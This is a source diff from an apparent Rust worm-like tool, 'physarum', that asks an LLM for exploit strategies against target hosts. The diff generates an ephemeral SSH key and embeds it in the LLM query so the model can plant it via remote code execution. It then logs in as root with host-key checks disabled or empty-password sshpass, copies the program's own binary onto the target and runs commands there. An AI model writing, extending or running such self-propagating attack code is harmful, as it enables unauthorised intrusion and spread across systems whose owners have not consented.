@@ -13,6 +13,7 @@
 ///   7. On rejection or failure → append to `rejected_strategies`, retry.
 ///   8. Stop at `MAX_ATTEMPTS` or on `PropagationMethod::NoPath`.
 use std::net::{IpAddr, Ipv4Addr, SocketAddr};
+use std::path::{Path, PathBuf};
 
 use anyhow::Result;
 use futures::stream::{self, StreamExt};
@@ -128,6 +129,25 @@ pub async fn run(
         tracing::info!(%target, ?cve_ids, "CVE candidates in DiscoveryQuery");
     }
 
+    // ── Ephemeral SSH keypair (Exploit class only) ────────────────────────────
+    // Generated once per target visit — the same pubkey is embedded in every
+    // DiscoveryQuery so the LLM can plant it via RCE in any attempt.
+    // The private key never leaves this process; it is cleaned up after the loop.
+    let ephemeral_key = if gate.exploit_enabled {
+        match generate_ephemeral_keypair().await {
+            Ok(k) => {
+                tracing::info!(%target, pubkey = %k.pubkey, "ephemeral SSH keypair generated");
+                Some(k)
+            }
+            Err(e) => {
+                tracing::warn!(%target, err = %e, "ephemeral keypair generation failed — exploit SSH path unavailable");
+                None
+            }
+        }
+    } else {
+        None
+    };
+
     let mut rejected: Vec<RejectedStrategy> = Vec::new();
 
     for attempt_number in 1..=MAX_ATTEMPTS {
@@ -145,6 +165,7 @@ pub async fn run(
             attempt_number,
             pattern_findings: pattern_summaries.clone(),
             source_ip: local_ip.map(IpAddr::V4),
+            ephemeral_pubkey: ephemeral_key.as_ref().map(|k| k.pubkey.clone()),
         };
 
         // ── Query LLM ────────────────────────────────────────────────────────
@@ -259,7 +280,8 @@ pub async fn run(
         };
 
         // ── Execute bootstrap ─────────────────────────────────────────────────
-        let exec_result = execute_bootstrap(&strategy, target).await;
+        let key_path = ephemeral_key.as_ref().map(|k| k.privkey_path.as_path());
+        let exec_result = execute_bootstrap(&strategy, target, key_path).await;
 
         // Shut down binary server after bootstrap attempt.
         if let Some(h) = binary_server {
@@ -291,9 +313,14 @@ pub async fn run(
 
         if succeeded {
             tracing::info!(%target, attempt = attempt_number, "LLM bootstrap succeeded");
+            // Clean up ephemeral key on success — no longer needed after propagation.
+            if let Some(key) = &ephemeral_key {
+                let _ = tokio::fs::remove_file(&key.privkey_path).await;
+                let pub_path = key.privkey_path.with_extension("pub");
+                let _ = tokio::fs::remove_file(&pub_path).await;
+            }
             let extended = lineage.extend(&target.to_string());
             *lineage = extended;
-            // Carry over evidence from failed attempts into the extended lineage
             return Ok(LlmOutcome::Propagated);
         }
 
@@ -301,6 +328,15 @@ pub async fn run(
     }
 
     tracing::warn!(%target, max = MAX_ATTEMPTS, "LLM max attempts exhausted — dead end");
+
+    // Clean up ephemeral key — private key material must not persist after the loop.
+    if let Some(key) = &ephemeral_key {
+        let _ = tokio::fs::remove_file(&key.privkey_path).await;
+        let pub_path = key.privkey_path.with_extension("pub");
+        let _ = tokio::fs::remove_file(&pub_path).await;
+        tracing::debug!(%target, "ephemeral SSH keypair removed");
+    }
+
     Ok(LlmOutcome::DeadEnd)
 }
 
@@ -1002,6 +1038,7 @@ fn build_lineage_summary(lineage: &Lineage) -> physarum_llm::LineageSummary {
 async fn execute_bootstrap(
     strategy: &physarum_llm::PropagationStrategy,
     target: Ipv4Addr,
+    key_path: Option<&Path>,
 ) -> ExecutionResultSummary {
     let plan = match &strategy.bootstrap_plan {
         Some(p) => p,
@@ -1014,7 +1051,7 @@ async fn execute_bootstrap(
     };
 
     for (i, step) in plan.steps.iter().enumerate() {
-        match execute_step(&step.action, target, step.timeout_ms).await {
+        match execute_step(&step.action, target, step.timeout_ms, key_path).await {
             StepResult::Ok | StepResult::Simulated => {
                 tracing::debug!(%target, step = i, "step ok");
             }
@@ -1037,7 +1074,41 @@ enum StepResult {
     Failed(String),
 }
 
-async fn execute_step(action: &BootstrapAction, target: Ipv4Addr, timeout_ms: u64) -> StepResult {
+/// Resolve the actual binary path for `__self__` sentinel in ScpUpload.
+fn resolve_local_path(local_path: &str) -> String {
+    if local_path == "__self__" {
+        std::env::current_exe()
+            .map(|p| p.to_string_lossy().to_string())
+            .unwrap_or_else(|_| "/usr/local/bin/physarum-maze".to_string())
+    } else {
+        local_path.to_string()
+    }
+}
+
+/// Build SSH/SCP arguments for either ephemeral-key or empty-password auth.
+///
+/// With key: `-i <key_path> -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`
+/// Without key: caller must prefix command with `sshpass -p ""`
+fn ssh_opts(key_path: Option<&Path>) -> Vec<String> {
+    let mut opts = vec![
+        "-o".into(),
+        "StrictHostKeyChecking=no".into(),
+        "-o".into(),
+        "UserKnownHostsFile=/dev/null".into(),
+    ];
+    if let Some(k) = key_path {
+        opts.push("-i".into());
+        opts.push(k.to_string_lossy().to_string());
+    }
+    opts
+}
+
+async fn execute_step(
+    action: &BootstrapAction,
+    target: Ipv4Addr,
+    timeout_ms: u64,
+    key_path: Option<&Path>,
+) -> StepResult {
     use tokio::process::Command;
     use tokio::time::{timeout, Duration};
 
@@ -1083,59 +1154,75 @@ async fn execute_step(action: &BootstrapAction, target: Ipv4Addr, timeout_ms: u6
             }
         }
 
-        BootstrapAction::SshCommand { command } => {
-            tracing::info!(%target, %command, "SSH command");
-            let ok = Command::new("sshpass")
-                .args([
-                    "-p",
-                    "",
-                    "ssh",
-                    "-o",
-                    "StrictHostKeyChecking=no",
-                    "-o",
-                    "UserKnownHostsFile=/dev/null",
-                    "-o",
-                    &format!("ConnectTimeout={}", timeout_ms / 1000 + 1),
-                    &format!("ec2-user@{target}"),
-                    command,
-                ])
-                .status()
-                .await
-                .map(|s| s.success())
-                .unwrap_or(false);
-            if ok {
-                StepResult::Ok
-            } else {
-                StepResult::Failed("ssh command failed".into())
+        BootstrapAction::SshCommand { command, user } => {
+            let remote_user = user.as_deref().unwrap_or("root");
+            let connect_timeout = format!("ConnectTimeout={}", timeout_ms / 1000 + 1);
+            tracing::info!(%target, %command, %remote_user, using_key = key_path.is_some(), "SSH command");
+
+            let opts = ssh_opts(key_path);
+            let mut args: Vec<String> = Vec::new();
+            if key_path.is_none() {
+                // Fall back to empty-password auth via sshpass
             }
+            args.extend(opts);
+            args.push("-o".into());
+            args.push(connect_timeout);
+            args.push(format!("{remote_user}@{target}"));
+            args.push(command.clone());
+
+            let ok = if key_path.is_some() {
+                Command::new("ssh")
+                    .args(&args)
+                    .status()
+                    .await
+                    .map(|s| s.success())
+                    .unwrap_or(false)
+            } else {
+                Command::new("sshpass")
+                    .arg("-p").arg("")
+                    .arg("ssh")
+                    .args(&args)
+                    .status()
+                    .await
+                    .map(|s| s.success())
+                    .unwrap_or(false)
+            };
+
+            if ok { StepResult::Ok } else { StepResult::Failed("ssh command failed".into()) }
         }
 
-        BootstrapAction::ScpUpload {
-            local_path,
-            remote_path,
-        } => {
-            tracing::info!(%target, %local_path, %remote_path, "SCP upload");
-            let ok = Command::new("sshpass")
-                .args([
-                    "-p",
-                    "",
-                    "scp",
-                    "-o",
-                    "StrictHostKeyChecking=no",
-                    "-o",
-                    "UserKnownHostsFile=/dev/null",
-                    local_path,
-                    &format!("ec2-user@{target}:{remote_path}"),
-                ])
-                .status()
-                .await
-                .map(|s| s.success())
-                .unwrap_or(false);
-            if ok {
-                StepResult::Ok
+        BootstrapAction::ScpUpload { local_path, remote_path, user } => {
+            let actual_local = resolve_local_path(local_path);
+            let remote_user = user.as_deref().unwrap_or("root");
+            tracing::info!(
+                %target, local = %actual_local, %remote_path, %remote_user,
+                using_key = key_path.is_some(), "SCP upload"
+            );
+
+            let opts = ssh_opts(key_path);
+            let mut scp_args: Vec<String> = opts;
+            scp_args.push(actual_local);
+            scp_args.push(format!("{remote_user}@{target}:{remote_path}"));
+
+            let ok = if key_path.is_some() {
+                Command::new("scp")
+                    .args(&scp_args)
+                    .status()
+                    .await
+                    .map(|s| s.success())
+                    .unwrap_or(false)
             } else {
-                StepResult::Failed("scp upload failed".into())
-            }
+                Command::new("sshpass")
+                    .arg("-p").arg("")
+                    .arg("scp")
+                    .args(&scp_args)
+                    .status()
+                    .await
+                    .map(|s| s.success())
+                    .unwrap_or(false)
+            };
+
+            if ok { StepResult::Ok } else { StepResult::Failed("scp upload failed".into()) }
         }
 
         BootstrapAction::ScpPullFromSource {
@@ -1197,6 +1284,52 @@ fn method_port(method: &PropagationMethod) -> Option<u16> {
         PropagationMethod::Http { port, .. } => *port,
         _ => None,
     }
+}
+
+// ── Ephemeral SSH keypair ─────────────────────────────────────────────────────
+
+struct EphemeralKey {
+    privkey_path: PathBuf,
+    /// OpenSSH public key string (e.g. "ssh-ed25519 AAAA... physarum-ephemeral").
+    pubkey: String,
+}
+
+/// Generate an ephemeral ed25519 SSH keypair via `ssh-keygen`.
+///
+/// Private key is written to `/tmp/physarum/ephemeral_key` (mode 600).
+/// Public key is returned as an OpenSSH one-liner for embedding in DiscoveryQuery.
+/// Both files are cleaned up by the caller after the exploit loop exits.
+async fn generate_ephemeral_keypair() -> anyhow::Result<EphemeralKey> {
+    use tokio::process::Command;
+
+    let key_dir = PathBuf::from("/tmp/physarum");
+    tokio::fs::create_dir_all(&key_dir).await?;
+
+    let privkey_path = key_dir.join("ephemeral_key");
+    // Remove stale key if present — ssh-keygen refuses to overwrite.
+    let _ = tokio::fs::remove_file(&privkey_path).await;
+    let _ = tokio::fs::remove_file(privkey_path.with_extension("pub")).await;
+
+    let status = Command::new("ssh-keygen")
+        .args([
+            "-t", "ed25519",
+            "-f", privkey_path.to_str().unwrap_or("/tmp/physarum/ephemeral_key"),
+            "-N", "",                   // empty passphrase
+            "-C", "physarum-ephemeral", // comment — identifies the key in authorized_keys
+            "-q",                       // quiet
+        ])
+        .status()
+        .await?;
+
+    anyhow::ensure!(status.success(), "ssh-keygen exited with {status}");
+
+    let pubkey_path = privkey_path.with_extension("pub");
+    let pubkey = tokio::fs::read_to_string(&pubkey_path).await?;
+
+    Ok(EphemeralKey {
+        privkey_path,
+        pubkey: pubkey.trim().to_string(),
+    })
 }
 
 // ── Template catalog builder ─────────────────────────────────────────────────
